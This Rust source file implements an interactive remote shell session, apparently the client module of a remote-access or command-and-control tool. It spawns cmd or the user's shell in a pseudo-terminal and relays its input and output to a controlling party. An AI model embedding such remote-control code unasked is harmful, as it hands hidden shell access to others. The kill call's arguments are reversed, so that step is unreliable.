use heroinn_util::session::{Session, SessionBase, SessionPacket};
use std::io::*;
use std::sync::{atomic::AtomicBool, mpsc::Sender, Arc};
#[cfg(target_os = "windows")]
use windows::Win32::System::Threading::{OpenProcess, WaitForSingleObject};

#[cfg(target_os = "windows")]
use conpty::*;

pub struct ShellClient {
    id: String,
    clientid: String,
    closed: Arc<AtomicBool>,
    #[cfg(target_os = "windows")]
    process: Process,
    #[cfg(target_os = "windows")]
    writer: conpty::io::PipeWriter,
    #[cfg(not(target_os = "windows"))]
    writer: std::fs::File,
    #[cfg(not(target_os = "windows"))]
    master: i32,
    #[cfg(not(target_os = "windows"))]
    slave: i32,
    #[cfg(not(target_os = "windows"))]
    pid: i32,
    sender: Sender<SessionBase>,
}

static MAGIC_FLAG: [u8; 2] = [0x37, 0x37];

pub fn makeword(a: u8, b: u8) -> u16 {
    ((a as u16) << 8) | b as u16
}

#[cfg(not(target_os = "windows"))]
pub fn set_termsize(fd: i32, mut size: Box<libc::winsize>) -> bool {
    (unsafe { libc::ioctl(fd, libc::TIOCSWINSZ, &mut *size) } as i32) > 0
}

#[cfg(not(target_os = "windows"))]
/// Look for a shell in the `$SHELL` environment variable
fn default_shell() -> String {
    std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
}

impl Session for ShellClient {
    #[cfg(target_os = "windows")]
    fn new_client(sender: Sender<SessionBase>, clientid: &String, id: &String) -> Result<Self> {
        let closed = Arc::new(AtomicBool::new(false));

        let process = match conpty::spawn("cmd") {
            Ok(p) => p,
            Err(e) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    e.to_string(),
                ));
            }
        };

        let pid = process.pid();

        let closed_2 = closed.clone();
        std::thread::spawn(move || {
            let handle = match unsafe {
                OpenProcess(
                    windows::Win32::System::Threading::PROCESS_ALL_ACCESS,
                    false,
                    pid,
                )
            } {
                Ok(p) => p,
                Err(e) => {
                    log::info!("open shell process error : {}", e);
                    closed_2.store(true, std::sync::atomic::Ordering::Relaxed);
                    return;
                }
            };

            if !handle.is_invalid() {
                unsafe { WaitForSingleObject(handle, 0xffffffff) };
            }

            log::info!("shell process exit");
            closed_2.store(true, std::sync::atomic::Ordering::Relaxed);
        });

        let writer = match process.input() {
            Ok(p) => p,
            Err(e) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    e.to_string(),
                ));
            }
        };
        let mut reader = match process.output() {
            Ok(p) => p,
            Err(e) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    e.to_string(),
                ));
            }
        };

        let id_1 = id.clone();
        let closed_1 = closed.clone();
        let clientid_1 = clientid.clone();

        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                if closed_1.load(std::sync::atomic::Ordering::Relaxed) {
                    break;
                }
                let mut buf: [u8; 1024] = [0; 1024];
                let size = match reader.read(&mut buf) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("shell process reader thread exit : {}", e);
                        break;
                    }
                };

                let packet = SessionPacket {
                    id: id_1.clone(),
                    data: buf[..size].to_vec(),
                };

                match sender_1.send(SessionBase {
                    id: id_1.clone(),
                    clientid: clientid_1.clone(),
                    packet,
                }) {
                    Ok(_) => {}
                    Err(e) => {
                        log::info!("sender closed : {}", e);
                        break;
                    }
                };
            }
            log::info!("shell worker closed");
            closed_1.store(true, std::sync::atomic::Ordering::Relaxed);
        });

        Ok(Self {
            id: id.clone(),
            clientid: clientid.clone(),
            closed,
            writer,
            process,
            sender,
        })
    }

    #[cfg(not(target_os = "windows"))]
    fn new_client(sender: Sender<SessionBase>, clientid: &String, id: &String) -> Result<Self> {
        use std::{
            fs::File,
            os::unix::prelude::{CommandExt, FromRawFd},
            process::{Command, Stdio},
        };

        use nix::unistd::fork;
        use nix::{pty::openpty, unistd::ForkResult};

        let closed = Arc::new(AtomicBool::new(false));

        let ends = openpty(None, None)?;
        let master = ends.master;
        let slave = ends.slave;

        let mut builder = Command::new(default_shell());

        let child_pid;
        let closed_2 = closed.clone();
        match unsafe { fork() } {
            Ok(ForkResult::Parent { child: pid, .. }) => {
                child_pid = pid.as_raw();
                std::thread::spawn(move || {
                    let mut status = 0;
                    unsafe { libc::waitpid(i32::from(pid), &mut status, 0) };
                    log::warn!("child process exit!");
                    closed_2.store(true, std::sync::atomic::Ordering::Relaxed);
                });
            }
            Ok(ForkResult::Child) => {
                unsafe { ioctl_rs::ioctl(master, ioctl_rs::TIOCNOTTY) };
                unsafe { libc::setsid() };
                unsafe { ioctl_rs::ioctl(slave, ioctl_rs::TIOCSCTTY) };

                builder
                    .stdin(unsafe { Stdio::from_raw_fd(slave) })
                    .stdout(unsafe { Stdio::from_raw_fd(slave) })
                    .stderr(unsafe { Stdio::from_raw_fd(slave) })
                    .exec();
                std::process::exit(0);
            }
            Err(e) => {
                log::error!("shell fork error : {}", e);
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    e.to_string(),
                ));
            }
        }

        let ptyin = unsafe { File::from_raw_fd(master) };
        let mut ptyout = unsafe { File::from_raw_fd(master) };

        let id_1 = id.clone();
        let closed_1 = closed.clone();
        let clientid_1 = clientid.clone();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                if closed_1.load(std::sync::atomic::Ordering::Relaxed) {
                    break;
                }

                let mut buf = [0u8; 1024];

                let size = match ptyout.read(&mut buf) {
                    Ok(p) => p,
                    Err(_) => break,
                };

                let packet = SessionPacket {
                    id: id_1.clone(),
                    data: buf[..size].to_vec(),
                };

                match sender_1.send(SessionBase {
                    id: id_1.clone(),
                    clientid: clientid_1.clone(),
                    packet: packet,
                }) {
                    Ok(_) => {}
                    Err(e) => {
                        log::info!("sender closed : {}", e);
                        break;
                    }
                };
            }
            log::info!("shell worker closed");
            closed_1.store(true, std::sync::atomic::Ordering::Relaxed);
        });

        Ok(Self {
            id: id.clone(),
            clientid: clientid.clone(),
            closed,
            sender,
            writer: ptyin,
            master,
            slave,
            pid: child_pid,
        })
    }

    fn id(&self) -> String {
        self.id.clone()
    }

    fn write(&mut self, data: &Vec<u8>) -> std::io::Result<()> {
        if data.len() == 3 && self.alive() && data == &vec![MAGIC_FLAG[0], MAGIC_FLAG[1], 0xff] {
            log::info!("client closed");
            self.close();
            return Ok(());
        }

        if data.len() == 6 && data[0] == MAGIC_FLAG[0] && data[1] == MAGIC_FLAG[1] {
            let row = makeword(data[2], data[3]);
            let col = makeword(data[4], data[5]);

            #[cfg(target_os = "windows")]
            self.process.resize(col as i16, row as i16).unwrap();

            #[cfg(not(target_os = "windows"))]
            let size = Box::new(libc::winsize {
                ws_row: row,
                ws_col: col,
                ws_xpixel: 0,
                ws_ypixel: 0,
            });
            #[cfg(not(target_os = "windows"))]
            set_termsize(self.slave, size);
            return Ok(());
        }

        #[cfg(target_os = "windows")]
        self.writer.write_all(data)?;

        #[cfg(not(target_os = "windows"))]
        self.writer.write_all(data)?;

        Ok(())
    }

    fn close(&mut self) {
        log::info!("shell closed");

        let packet = SessionPacket {
            id: self.id.clone(),
            data: vec![MAGIC_FLAG[0], MAGIC_FLAG[1], 0xff],
        };

        match self.sender.send(SessionBase {
            id: self.id.clone(),
            clientid: self.clientid.clone(),
            packet,
        }) {
            Ok(_) => {}
            Err(_) => {}
        };

        #[cfg(not(target_os = "windows"))]
        unsafe {
            libc::kill(9, self.pid)
        };
        #[cfg(not(target_os = "windows"))]
        unsafe {
            libc::close(self.slave)
        };
        #[cfg(not(target_os = "windows"))]
        unsafe {
            libc::close(self.master)
        };

        #[cfg(target_os = "windows")]
        match self.process.exit(0) {
            Ok(_) => {}
            Err(_) => {}
        };
        self.closed
            .store(true, std::sync::atomic::Ordering::Relaxed);
    }

    fn alive(&self) -> bool {
        !self.closed.load(std::sync::atomic::Ordering::Relaxed)
    }

    fn clientid(&self) -> String {
        self.clientid.clone()
    }

    fn new(_sender: Sender<SessionBase>, _id: &String, _: &String) -> Result<Self> {
        Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "not server",
        ))
    }
}
